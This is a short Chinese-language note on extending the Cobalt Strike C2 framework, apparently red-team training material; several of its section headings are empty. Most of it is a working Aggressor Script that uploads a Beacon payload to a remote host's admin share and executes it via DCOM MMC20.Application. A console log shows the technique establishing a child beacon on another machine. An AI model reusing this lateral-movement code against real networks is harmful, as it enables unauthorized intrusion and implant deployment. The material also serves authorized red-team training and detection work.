# Extending Cobalt Strike

这一章主要讲C2的扩展


（作者认为）好的C2框架必须具备可定制化，可扩展。

# Elevate Kit

# Jump & Remote-Exec

将 Invoke-DCOM.ps1 集成到jump
```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via this powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

```$+```是一个字符串的连接符号，两边都需要加空格
```
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    dcom                      x64   Use DCOM to run a Beacon payload
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM

beacon> getuid
[*] Tasked beacon to get userid
[*] You are DEV\bfarmer

beacon> jump dcom srv-1 smb
[*] Tasked Beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_a3) on srv-1 via DCOM
[+] established link to child beacon: 10.10.17.25
[+] received output:
Completed
```

# Beacon Object Files

# Malleable Command & Control